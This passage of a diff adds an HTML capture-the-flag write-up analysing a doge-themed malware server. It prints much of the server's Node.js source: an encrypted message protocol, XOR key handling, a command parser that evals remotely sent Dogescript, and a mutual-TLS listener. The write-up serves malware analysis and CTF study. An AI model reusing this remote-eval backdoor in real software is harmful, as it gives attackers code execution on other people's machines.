+        <span class="k">this</span><span class="p">.</span><span class="nx">_process</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
+        <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
+    <span class="p">};</span>
+    <span class="nx">_readBytes</span><span class="p">(</span><span class="nx">size</span><span class="p">)</span> <span class="p">{</span>
+        <span class="kd">let</span> <span class="nx">result</span><span class="p">;</span>
+        <span class="k">this</span><span class="p">.</span><span class="nx">_bufferedBytes</span> <span class="o">-=</span> <span class="nx">size</span><span class="p">;</span>
+
+        <span class="k">if</span> <span class="p">(</span><span class="nx">size</span> <span class="o">===</span> <span class="k">this</span><span class="p">.</span><span class="nx">queue</span><span class="p">[</span><span class="mf">0</span><span class="p">].</span><span class="nx">length</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">return</span> <span class="k">this</span><span class="p">.</span><span class="nx">queue</span><span class="p">.</span><span class="nx">shift</span><span class="p">();</span>
+        <span class="p">}</span>
+
+        <span class="k">if</span> <span class="p">(</span><span class="nx">size</span> <span class="o">&lt;</span> <span class="k">this</span><span class="p">.</span><span class="nx">queue</span><span class="p">[</span><span class="mf">0</span><span class="p">].</span><span class="nx">length</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nx">result</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">queue</span><span class="p">[</span><span class="mf">0</span><span class="p">].</span><span class="nx">slice</span><span class="p">(</span><span class="mf">0</span><span class="p">,</span> <span class="nx">size</span><span class="p">);</span>
+            <span class="k">this</span><span class="p">.</span><span class="nx">queue</span><span class="p">[</span><span class="mf">0</span><span class="p">]</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">queue</span><span class="p">[</span><span class="mf">0</span><span class="p">].</span><span class="nx">slice</span><span class="p">(</span><span class="nx">size</span><span class="p">);</span>
+            <span class="k">return</span> <span class="nx">result</span><span class="p">;</span>
+        <span class="p">}</span>
+
+        <span class="nx">result</span> <span class="o">=</span> <span class="nx">Buffer</span><span class="p">.</span><span class="nx">allocUnsafe</span><span class="p">(</span><span class="nx">size</span><span class="p">);</span>
+        <span class="kd">let</span> <span class="nx">offset</span> <span class="o">=</span> <span class="mf">0</span><span class="p">;</span>
+        <span class="kd">let</span> <span class="nx">length</span><span class="p">;</span>
+        <span class="k">while</span> <span class="p">(</span><span class="nx">size</span> <span class="o">&gt;</span> <span class="mf">0</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nx">length</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">queue</span><span class="p">[</span><span class="mf">0</span><span class="p">].</span><span class="nx">length</span><span class="p">;</span>
+
+            <span class="k">if</span> <span class="p">(</span><span class="nx">size</span> <span class="o">&gt;=</span> <span class="nx">length</span><span class="p">)</span> <span class="p">{</span>
+                <span class="k">this</span><span class="p">.</span><span class="nx">queue</span><span class="p">[</span><span class="mf">0</span><span class="p">].</span><span class="nx">copy</span><span class="p">(</span><span class="nx">result</span><span class="p">,</span> <span class="nx">offset</span><span class="p">);</span>
+                <span class="nx">offset</span> <span class="o">+=</span> <span class="nx">length</span><span class="p">;</span>
+                <span class="k">this</span><span class="p">.</span><span class="nx">queue</span><span class="p">.</span><span class="nx">shift</span><span class="p">();</span>
+            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+                <span class="k">this</span><span class="p">.</span><span class="nx">queue</span><span class="p">[</span><span class="mf">0</span><span class="p">].</span><span class="nx">copy</span><span class="p">(</span><span class="nx">result</span><span class="p">,</span> <span class="nx">offset</span><span class="p">,</span> <span class="mf">0</span><span class="p">,</span> <span class="nx">size</span><span class="p">);</span>
+                <span class="k">this</span><span class="p">.</span><span class="nx">queue</span><span class="p">[</span><span class="mf">0</span><span class="p">]</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">queue</span><span class="p">[</span><span class="mf">0</span><span class="p">].</span><span class="nx">slice</span><span class="p">(</span><span class="nx">size</span><span class="p">);</span>
+            <span class="p">}</span>
+
+            <span class="nx">size</span> <span class="o">-=</span> <span class="nx">length</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="k">return</span> <span class="nx">result</span><span class="p">;</span>
+    <span class="p">};</span>
+    <span class="nx">_getHeader</span><span class="p">()</span> <span class="p">{</span>
+        <span class="kd">let</span> <span class="nx">stupid</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">_hasEnough</span><span class="p">(</span><span class="mf">4</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nx">stupid</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">this</span><span class="p">.</span><span class="nx">_payloadLength</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">_readBytes</span><span class="p">(</span><span class="mf">4</span><span class="p">).</span><span class="nx">readUInt32BE</span><span class="p">(</span><span class="mf">0</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
+            <span class="k">this</span><span class="p">.</span><span class="nx">_state</span> <span class="o">=</span> <span class="s1">&#39;PAYLOAD&#39;</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">};</span>
+    <span class="nx">_getPayload</span><span class="p">()</span> <span class="p">{</span>
+        <span class="kd">let</span> <span class="nx">stupid</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">_hasEnough</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">_payloadLength</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nx">stupid</span><span class="p">)</span> <span class="p">{</span>
+            <span class="kd">let</span> <span class="nx">received</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">_readBytes</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">_payloadLength</span><span class="p">);</span>
+            <span class="k">this</span><span class="p">.</span><span class="nx">_parseMessage</span><span class="p">(</span><span class="nx">received</span><span class="p">);</span>
+            <span class="k">this</span><span class="p">.</span><span class="nx">_state</span> <span class="o">=</span> <span class="s1">&#39;HEADER&#39;</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">};</span>
+    <span class="nx">_onData</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">while</span> <span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">_process</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">if</span> <span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">_state</span> <span class="o">===</span> <span class="s1">&#39;HEADER&#39;</span><span class="p">)</span> <span class="p">{</span>
+                <span class="k">this</span><span class="p">.</span><span class="nx">_getHeader</span><span class="p">();</span>
+            <span class="p">}</span>
+            <span class="k">if</span> <span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">_state</span> <span class="o">===</span> <span class="s1">&#39;PAYLOAD&#39;</span><span class="p">)</span> <span class="p">{</span>
+                <span class="k">this</span><span class="p">.</span><span class="nx">_getPayload</span><span class="p">();</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+    <span class="p">};</span>
+    <span class="nx">_encrypt</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
+        <span class="kd">var</span> <span class="nx">iv</span> <span class="o">=</span> <span class="nx">Buffer</span><span class="p">.</span><span class="nx">alloc</span><span class="p">(</span><span class="mf">16</span><span class="p">,</span> <span class="mf">0</span><span class="p">);</span>
+        <span class="kd">var</span> <span class="nx">wow_cripter</span> <span class="o">=</span> <span class="nx">crypto</span><span class="p">.</span><span class="nx">createCipheriv</span><span class="p">(</span><span class="s1">&#39;aes-128-cbc&#39;</span><span class="p">,</span> <span class="k">this</span><span class="p">.</span><span class="nx">aes_key</span><span class="p">,</span> <span class="nx">iv</span><span class="p">);</span>
+        <span class="nx">wow_cripter</span><span class="p">.</span><span class="nx">setAutoPadding</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span>
+        <span class="k">return</span> <span class="nx">Buffer</span><span class="p">.</span><span class="nx">concat</span><span class="p">([</span><span class="nx">wow_cripter</span><span class="p">.</span><span class="nx">update</span><span class="p">(</span><span class="nx">data</span><span class="p">),</span> <span class="nx">wow_cripter</span><span class="p">.</span><span class="kr">final</span><span class="p">()]);</span>
+    <span class="p">};</span>
+    <span class="nx">_decrypt</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
+        <span class="kd">var</span> <span class="nx">iv</span> <span class="o">=</span> <span class="nx">Buffer</span><span class="p">.</span><span class="nx">alloc</span><span class="p">(</span><span class="mf">16</span><span class="p">,</span> <span class="mf">0</span><span class="p">);</span>
+        <span class="kd">var</span> <span class="nx">wow_decripter</span> <span class="o">=</span> <span class="nx">crypto</span><span class="p">.</span><span class="nx">createDecipheriv</span><span class="p">(</span><span class="s1">&#39;aes-128-cbc&#39;</span><span class="p">,</span> <span class="k">this</span><span class="p">.</span><span class="nx">aes_key</span><span class="p">,</span> <span class="nx">iv</span><span class="p">);</span>
+        <span class="nx">wow_decripter</span><span class="p">.</span><span class="nx">setAutoPadding</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span>
+        <span class="k">return</span> <span class="nx">Buffer</span><span class="p">.</span><span class="nx">concat</span><span class="p">([</span><span class="nx">wow_decripter</span><span class="p">.</span><span class="nx">update</span><span class="p">(</span><span class="nx">data</span><span class="p">),</span> <span class="nx">wow_decripter</span><span class="p">.</span><span class="kr">final</span><span class="p">()]);</span>
+    <span class="p">};</span>
+    <span class="nx">send</span><span class="p">(</span><span class="nx">message</span><span class="p">)</span> <span class="p">{</span>
+        <span class="kd">let</span> <span class="nx">hmac</span> <span class="o">=</span> <span class="nx">crypto</span><span class="p">.</span><span class="nx">createHmac</span><span class="p">(</span><span class="s1">&#39;sha256&#39;</span><span class="p">,</span> <span class="k">this</span><span class="p">.</span><span class="nx">hmac_key</span><span class="p">);</span>
+        <span class="kd">let</span> <span class="nx">mbuf</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">_encrypt</span><span class="p">(</span><span class="nx">message</span><span class="p">);</span>
+        <span class="nx">hmac</span><span class="p">.</span><span class="nx">update</span><span class="p">(</span><span class="nx">mbuf</span><span class="p">);</span>
+        <span class="kd">let</span> <span class="nx">chksum</span> <span class="o">=</span> <span class="nx">hmac</span><span class="p">.</span><span class="nx">digest</span><span class="p">();</span>
+        <span class="kd">let</span> <span class="nx">buffer</span> <span class="o">=</span> <span class="nx">Buffer</span><span class="p">.</span><span class="nx">concat</span><span class="p">([</span><span class="nx">chksum</span><span class="p">,</span> <span class="nx">mbuf</span><span class="p">]);</span>
+        <span class="k">this</span><span class="p">.</span><span class="nx">_header</span><span class="p">(</span><span class="nx">buffer</span><span class="p">.</span><span class="nx">length</span><span class="p">);</span>
+        <span class="k">this</span><span class="p">.</span><span class="nx">_packet</span><span class="p">.</span><span class="nx">message</span> <span class="o">=</span> <span class="nx">buffer</span><span class="p">;</span>
+        <span class="k">this</span><span class="p">.</span><span class="nx">_send</span><span class="p">();</span>
+    <span class="p">};</span>
+    <span class="nx">_parseMessage</span><span class="p">(</span><span class="nx">received</span><span class="p">)</span> <span class="p">{</span>
+        <span class="kd">var</span> <span class="nx">hmac</span> <span class="o">=</span> <span class="nx">crypto</span><span class="p">.</span><span class="nx">createHmac</span><span class="p">(</span><span class="s1">&#39;sha256&#39;</span><span class="p">,</span> <span class="k">this</span><span class="p">.</span><span class="nx">hmac_key</span><span class="p">);</span>
+        <span class="kd">var</span> <span class="nx">checksum</span> <span class="o">=</span> <span class="nx">received</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mf">0</span><span class="p">,</span> <span class="mf">32</span><span class="p">)</span>
+            <span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="s1">&#39;hex&#39;</span><span class="p">);</span>
+        <span class="kd">var</span> <span class="nx">message</span> <span class="o">=</span> <span class="nx">received</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mf">32</span><span class="p">);</span>
+        <span class="nx">hmac</span><span class="p">.</span><span class="nx">update</span><span class="p">(</span><span class="nx">message</span><span class="p">);</span>
+        <span class="kd">let</span> <span class="nx">stupid</span> <span class="o">=</span> <span class="nx">hmac</span><span class="p">.</span><span class="nx">digest</span><span class="p">(</span><span class="s1">&#39;hex&#39;</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nx">checksum</span> <span class="o">===</span> <span class="nx">stupid</span><span class="p">)</span> <span class="p">{</span>
+            <span class="kd">var</span> <span class="nx">dec_message</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">_decrypt</span><span class="p">(</span><span class="nx">message</span><span class="p">);</span>
+            <span class="k">this</span><span class="p">.</span><span class="nx">socket</span><span class="p">.</span><span class="nx">emit</span><span class="p">(</span><span class="s1">&#39;served&#39;</span><span class="p">,</span> <span class="nx">dec_message</span><span class="p">);</span>
+        <span class="p">}</span>
+    <span class="p">};</span>
+    <span class="nx">_header</span><span class="p">(</span><span class="nx">messageLength</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">this</span><span class="p">.</span><span class="nx">_packet</span><span class="p">.</span><span class="nx">header</span> <span class="o">=</span> <span class="p">{</span>
+            <span class="nx">length</span><span class="o">:</span> <span class="nx">messageLength</span>
+        <span class="p">};</span>
+    <span class="p">};</span>
+    <span class="nx">_send</span><span class="p">()</span> <span class="p">{</span>
+        <span class="kd">var</span> <span class="nx">contentLength</span> <span class="o">=</span> <span class="nx">Buffer</span><span class="p">.</span><span class="nx">allocUnsafe</span><span class="p">(</span><span class="mf">4</span><span class="p">);</span>
+        <span class="nx">contentLength</span><span class="p">.</span><span class="nx">writeUInt32BE</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">_packet</span><span class="p">.</span><span class="nx">header</span><span class="p">.</span><span class="nx">length</span><span class="p">);</span>
+        <span class="k">this</span><span class="p">.</span><span class="nx">socket</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="nx">contentLength</span><span class="p">);</span>
+        <span class="k">this</span><span class="p">.</span><span class="nx">socket</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">_packet</span><span class="p">.</span><span class="nx">message</span><span class="p">);</span>
+        <span class="k">this</span><span class="p">.</span><span class="nx">_packet</span> <span class="o">=</span> <span class="p">{};</span>
+    <span class="p">};</span>
+<span class="p">}</span>
+
+<span class="nx">module</span><span class="p">.</span><span class="nx">exports</span> <span class="o">=</span> <span class="nx">Networker</span>
+</code></pre></div>
+</td></tr></table></p>
+<p>Also inside the malware is an embedded client certificate and RSA private key, which are
+needed to authenticate against the malware server.</p>
+<p>Digging into the start of the main program, we see the method used to generate the 
+key:</p>
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span> 8
+ 9
+10
+11
+12
+13
+14
+15
+16
+17
+18</pre></div></td><td class="code"><div class="highlight"><pre><span></span><code><span class="kd">var</span> <span class="nx">cript_key</span> <span class="o">=</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">random</span><span class="p">()</span>
+    <span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mf">36</span><span class="p">)</span>
+    <span class="p">.</span><span class="nx">substr</span><span class="p">(</span><span class="mf">2</span><span class="p">,</span> <span class="mf">15</span><span class="p">);</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">CRYPTZ</span> <span class="o">===</span> <span class="kc">undefined</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;no cryptz key. doge can not crypt catz.&#39;</span><span class="p">);</span>
+    <span class="nx">process</span><span class="p">.</span><span class="nx">exit</span><span class="p">(</span><span class="mf">1</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="kd">var</span> <span class="nx">secrit_key</span> <span class="o">=</span> <span class="nx">cript</span><span class="p">(</span><span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">CRYPTZ</span><span class="p">,</span> <span class="nx">cript_key</span><span class="p">);</span>
+<span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">CRYPTZ</span> <span class="o">=</span> <span class="s1">&#39;you dnt git key&#39;</span><span class="p">;</span>
+<span class="k">delete</span> <span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">CRYPTZ</span><span class="p">;</span>
+</code></pre></div>
+</td></tr></table>
+<p>A random <code>cript_key</code> is generated, then passed to the <code>cript()</code> function along with the
+contents of the environment variable <code>CRYPTZ</code>, the result of which is stored in <code>secrit_key</code>.
+The <code>CRYPTZ</code> environment variable is then set to a value (<code>you dnt get key</code>), then deleted
+from memory, presumably in an attempt to prevent it's content from being discovered by
+memory forensics. However, the same process is not performed on on the <code>cript_key</code> variable,
+which will be important later.</p>
+<p>The <code>cript()</code> function is a simple <code>XOR</code> of the two arguments:</p>
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35</pre></div></td><td class="code"><div class="highlight"><pre><span></span><code><span class="kd">function</span> <span class="nx">cript</span><span class="p">(</span><span class="nx">input</span><span class="p">,</span> <span class="nx">key</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kd">var</span> <span class="nx">c</span> <span class="o">=</span> <span class="nx">Buffer</span><span class="p">.</span><span class="nx">alloc</span><span class="p">(</span><span class="nx">input</span><span class="p">.</span><span class="nx">length</span><span class="p">);</span>
+    <span class="k">while</span> <span class="p">(</span><span class="nx">key</span><span class="p">.</span><span class="nx">length</span> <span class="o">&lt;</span> <span class="nx">input</span><span class="p">.</span><span class="nx">length</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">key</span> <span class="o">+=</span> <span class="nx">key</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="kd">var</span> <span class="nx">ib</span> <span class="o">=</span> <span class="nx">Buffer</span><span class="p">.</span><span class="nx">from</span><span class="p">(</span><span class="nx">input</span><span class="p">);</span>
+    <span class="kd">var</span> <span class="nx">kb</span> <span class="o">=</span> <span class="nx">Buffer</span><span class="p">.</span><span class="nx">from</span><span class="p">(</span><span class="nx">key</span><span class="p">);</span>
+    <span class="k">for</span> <span class="p">(</span><span class="nx">i</span> <span class="o">=</span> <span class="mf">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">input</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+<span class="hll">        <span class="nx">c</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="o">=</span> <span class="nx">ib</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="o">^</span> <span class="nx">kb</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span>
+</span>    <span class="p">}</span>
+    <span class="k">return</span> <span class="nx">c</span><span class="p">.</span><span class="nx">toString</span><span class="p">();</span>
+<span class="p">}</span>
+</code></pre></div>
+</td></tr></table>
+<p>Continuing through the program, we see a function that parses commands sent to the server:</p>
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65</pre></div></td><td class="code"><div class="highlight"><pre><span></span><code><span class="kd">function</span> <span class="nx">dogeParam</span><span class="p">(</span><span class="nx">buffer</span><span class="p">)</span> <span class="p">{</span>
+<span class="hll">    <span class="kd">var</span> <span class="nx">doge_command</span> <span class="o">=</span> <span class="nx">dson</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">buffer</span><span class="p">);</span>
+</span>    <span class="kd">var</span> <span class="nx">doge_response</span> <span class="o">=</span> <span class="p">{};</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="s1">&#39;dogesez&#39;</span> <span class="k">in</span> <span class="nx">doge_command</span><span class="p">))</span> <span class="p">{</span>
+        <span class="nx">doge_response</span><span class="p">[</span><span class="s1">&#39;dogesez&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;bonk&#39;</span><span class="p">;</span>
+        <span class="nx">doge_response</span><span class="p">[</span><span class="s1">&#39;shibe&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;doge not sez&#39;</span><span class="p">;</span>
+        <span class="k">return</span> <span class="nx">dson</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nx">doge_response</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="nx">doge_command</span><span class="p">.</span><span class="nx">dogesez</span> <span class="o">===</span> <span class="s1">&#39;ping&#39;</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">doge_response</span><span class="p">[</span><span class="s1">&#39;dogesez&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;pong&#39;</span><span class="p">;</span>
+        <span class="nx">doge_response</span><span class="p">[</span><span class="s1">&#39;ohmaze&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nx">doge_command</span><span class="p">.</span><span class="nx">ohmaze</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="nx">doge_command</span><span class="p">.</span><span class="nx">dogesez</span> <span class="o">===</span> <span class="s1">&#39;do me a favor&#39;</span><span class="p">)</span> <span class="p">{</span>
+        <span class="kd">var</span> <span class="nx">favor</span> <span class="o">=</span> <span class="kc">undefined</span><span class="p">;</span>
+        <span class="kd">var</span> <span class="nx">doge</span> <span class="o">=</span> <span class="kc">undefined</span><span class="p">;</span>
+        <span class="k">try</span> <span class="p">{</span>
+            <span class="nx">doge</span> <span class="o">=</span> <span class="nx">dogescript</span><span class="p">(</span><span class="nx">doge_command</span><span class="p">.</span><span class="nx">ohmaze</span><span class="p">);</span>
+            <span class="nx">favor</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="nx">doge</span><span class="p">);</span>
+            <span class="nx">doge_response</span><span class="p">[</span><span class="s1">&#39;dogesez&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;welcome&#39;</span><span class="p">;</span>
+            <span class="nx">doge_response</span><span class="p">[</span><span class="s1">&#39;ohmaze&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nx">favor</span><span class="p">;</span>
+        <span class="p">}</span> <span class="k">catch</span> <span class="p">{</span>
+            <span class="nx">doge_response</span><span class="p">[</span><span class="s1">&#39;dogesez&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;bonk&#39;</span><span class="p">;</span>
+            <span class="nx">doge_response</span><span class="p">[</span><span class="s1">&#39;shibe&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;doge sez no&#39;</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">...</span>
+</code></pre></div>
+</td></tr></table>
+<p>The function is passed a buffer containing a command string, which is encoded as
+<code>DSON</code>, or <a href="https://dogeon.xyz/">Doge Serialized Object Notation</a> (sigh). The malware
+is using the <a href="https://github.com/kpdecker/dogeon">dogeon</a> serializer to parse the
+requests from the client.  Commands from the client are passed as the value of the
+<code>dogesez</code> attribute. There are many different commands, but the important one is <code>'do
+me a favor'</code>, which runs a Dogescript and returns the result to the caller. We can
+also perform a <code>'ping'</code> to the server to check that our messages are being received
+correctly. The remaining commands deal with encrypting files sent to the server,
+but for the purposes of this CTF aren't necessary.</p>
+<p>At the end of the main program is the code that handles connections from the client:</p>
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>176
+177
+178
+179
+180
+181
+182
+183
+184
+185
+186
+187
+188
+189
+190
+191
+192
+193
+194
+195
+196
+197
+198
+199
+200
+201
+202
+203
+204</pre></div></td><td class="code"><div class="highlight"><pre><span></span><code><span class="kr">const</span> <span class="nx">options</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="nx">key</span><span class="o">:</span> <span class="nx">servs_key</span><span class="p">,</span>
+    <span class="nx">cert</span><span class="o">:</span> <span class="nx">servs_cert</span><span class="p">,</span>
+<span class="hll">    <span class="nx">requestCert</span><span class="o">:</span> <span class="kc">true</span><span class="p">,</span>
+</span><span class="hll">    <span class="nx">rejectUnauthorized</span><span class="o">:</span> <span class="kc">true</span><span class="p">,</span>
+</span>    <span class="nx">ca</span><span class="o">:</span> <span class="p">[</span><span class="nx">doge_ca</span><span class="p">]</span>
+<span class="p">};</span>
+
+<span class="kr">const</span> <span class="nx">server</span> <span class="o">=</span> <span class="nx">tls</span><span class="p">.</span><span class="nx">createServer</span><span class="p">(</span><span class="nx">options</span><span class="p">,</span> <span class="p">(</span><span class="nx">socket</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+<span class="hll">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;doge connected: &#39;</span><span class="p">,</span>
+</span><span class="hll">        <span class="nx">socket</span><span class="p">.</span><span class="nx">authorized</span> <span class="o">?</span> <span class="s1">&#39;TOP doge&#39;</span> <span class="o">:</span> <span class="s1">&#39;not top doge&#39;</span><span class="p">);</span>
+</span>    <span class="kd">let</span> <span class="nx">networker</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Networker</span><span class="p">(</span><span class="nx">socket</span><span class="p">,</span> <span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+<span class="hll">        <span class="kd">var</span> <span class="nx">doge_lingo</span> <span class="o">=</span> <span class="nx">data</span><span class="p">.</span><span class="nx">toString</span><span class="p">();</span>
+</span>        <span class="c1">// console.log(&#39;top doge sez:&#39;, doge_lingo);</span>
+        <span class="kd">var</span> <span class="nx">doge_woof</span> <span class="o">=</span> <span class="nx">dogeParam</span><span class="p">(</span><span class="nx">doge_lingo</span><span class="p">);</span>
+        <span class="nx">networker</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">doge_woof</span><span class="p">);</span>
+        <span class="c1">// networker.send(dogeParam(data.toString()));</span>
+    <span class="p">});</span>
+<span class="hll">    <span class="nx">networker</span><span class="p">.</span><span class="nx">init</span><span class="p">(</span><span class="s1">&#39;such doge is yes wow&#39;</span><span class="p">,</span> <span class="s1">&#39;such doge is shibe wow&#39;</span><span class="p">);</span>
+</span><span class="p">});</span>
+<span class="nx">server</span><span class="p">.</span><span class="nx">listen</span><span class="p">(</span><span class="mf">41414</span><span class="p">,</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="p">{</span>
+    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;doge waiting for command from top doge&#39;</span><span class="p">);</span>
+<span class="p">});</span>
+<span class="nx">server</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="s1">&#39;connection&#39;</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">c</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;doge connect&#39;</span><span class="p">);</span>
+<span class="p">});</span>
+<span class="nx">server</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="s1">&#39;secureConnect&#39;</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">c</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;doge connect secure&#39;</span><span class="p">);</span>
+<span class="p">});</span>
+</code></pre></div>
+</td></tr></table>
+<p>The <code>tls.createServer</code> function creates a server to receive requests. The <code>options</code> specify
+that the server will request a certificate from the client, and will reject any connections
+from clients that don't. Finally, the data is passed through a <code>networker</code> object, defined 
+in the <code>Network protocol</code> above. </p>
+<p>We see the <code>init</code> method of the <code>networker</code> object is called with two strings: <code>such
+doge is yes wow</code> and <code>such doge is dhibe wow</code>. These phrases are combined with the salt
+<code>suchdoge4evawow</code> to create two keys: 1 for an HMAC algorithm, and one for AES encryption.</p>
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>16
+17
+18
+19</pre></div></td><td class="code"><div class="highlight"><pre><span></span><code>    <span class="nx">init</span><span class="p">(</span><span class="nx">hmac_key</span><span class="p">,</span> <span class="nx">aes_key</span><span class="p">)</span> <span class="p">{</span>
+        <span class="kd">var</span> <span class="nx">salty_wow</span> <span class="o">=</span> <span class="s1">&#39;suchdoge4evawow&#39;</span><span class="p">;</span>
+<span class="hll">        <span class="k">this</span><span class="p">.</span><span class="nx">hmac_key</span> <span class="o">=</span> <span class="nx">crypto</span><span class="p">.</span><span class="nx">pbkdf2Sync</span><span class="p">(</span><span class="nx">hmac_key</span><span class="p">,</span> <span class="nx">salty_wow</span><span class="p">,</span> <span class="mf">4096</span><span class="p">,</span> <span class="mf">16</span><span class="p">,</span> <span class="s1">&#39;sha256&#39;</span><span class="p">);</span>
+</span><span class="hll">        <span class="k">this</span><span class="p">.</span><span class="nx">aes_key</span> <span class="o">=</span> <span class="nx">crypto</span><span class="p">.</span><span class="nx">pbkdf2Sync</span><span class="p">(</span><span class="nx">aes_key</span><span class="p">,</span> <span class="nx">salty_wow</span><span class="p">,</span> <span class="mf">4096</span><span class="p">,</span> <span class="mf">16</span><span class="p">,</span> <span class="s1">&#39;sha256&#39;</span><span class="p">);</span>
+</span></code></pre></div>
+</td></tr></table>
